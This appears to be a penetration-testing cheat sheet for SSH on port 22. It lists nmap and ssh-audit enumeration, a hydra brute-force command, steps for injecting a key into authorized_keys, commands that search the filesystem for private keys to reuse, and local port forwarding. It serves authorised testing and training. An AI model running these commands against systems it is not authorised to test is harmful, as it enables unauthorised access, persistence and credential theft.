# SSH (22)

!!! tip "Start here"
    Fingerprint algorithms with `ssh-audit $IP`, then check authentication methods for a known username. A password prompt is evidence that password authentication is available; it is not a reason to begin broad brute force.

---

## Enumeration

```bash
nmap -p 22 -sV --script ssh-hostkey,ssh2-enum-algos $IP
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=$USERNAME" $IP
ssh-audit $IP
```

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt ssh://$IP
```

---

## SSH Key Injection

If you have write access to a user's `.ssh` directory (via another vulnerability):

```bash
ssh-keygen -t ed25519 -f /tmp/injected_key
cat /tmp/injected_key.pub >> "/home/$USERNAME/.ssh/authorized_keys"
ssh -i /tmp/injected_key "$USERNAME@$IP"
```

---

## Finding Private Keys

Look for exposed private keys after gaining access:

```bash
find / -type f \( -name id_rsa -o -name id_ed25519 \) 2>/dev/null
grep -rl "PRIVATE KEY" / 2>/dev/null
```

Common locations:
- `/home/*/.ssh/id_rsa`
- `/root/.ssh/id_rsa`
- Git repos, config backups, `.bak` files

Once found:

```bash
chmod 600 id_rsa
ssh -i id_rsa "$USERNAME@$IP"
```

---

## Local Port Forwarding

Forward an internal service to your attacker machine:

```bash
ssh -N -L 127.0.0.1:8080:127.0.0.1:8080 "$USERNAME@$IP"
ssh -N -L 127.0.0.1:3306:127.0.0.1:3306 "$USERNAME@$IP"
```
